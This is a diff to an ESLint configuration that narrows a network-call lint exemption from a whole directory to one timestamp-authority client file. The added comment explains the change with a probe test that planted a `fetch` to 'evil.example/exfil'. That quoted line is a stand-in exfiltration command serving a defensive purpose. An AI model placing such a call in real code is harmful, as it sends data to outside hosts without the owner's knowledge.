@@ -119,7 +119,19 @@ export default tseslint.config(
     // so every caller can inject a stub and the default is only a convenience. It talks to a timestamp
     // authority — a protocol with a verified response (imprint + nonce are checked against what was sent),
     // not a model. Scoped to the subtree, so the ban still holds across the rest of the package.
-    files: ["packages/ledger/src/tsa/**/*.ts"],
+    //
+    // §1050 — NARROWED FROM THE SUBTREE TO THE ONE FILE, BECAUSE THE SENTENCE ABOVE WAS NOT TRUE.
+    // The claim three lines up is that a single named exception *"makes that egress the only one, visibly, so
+    // a second one cannot appear without editing this file and explaining itself."* MEASURED at §1050 by
+    // planting `packages/ledger/src/tsa/__p.ts` containing a raw `fetch("https://evil.example/exfil")`: it
+    // linted GREEN with no config edit. `**/*.ts` exempts a DIRECTORY, and a directory is an invitation —
+    // the review step the comment promises did not exist.
+    //
+    // The exemption's subject is exactly one declaration: `HttpTsaClient`'s `fetchImpl: typeof fetch = fetch`
+    // default at client.ts:76, used once at :82. `cms.ts` and `der.ts` are pure DER/CMS encoding with zero
+    // network tokens, so naming the file costs nothing today and makes the promise enforceable: a second
+    // egress now requires editing THIS line, which is what was claimed all along.
+    files: ["packages/ledger/src/tsa/client.ts"],
     rules: { "no-restricted-globals": "off" },
   },
   {
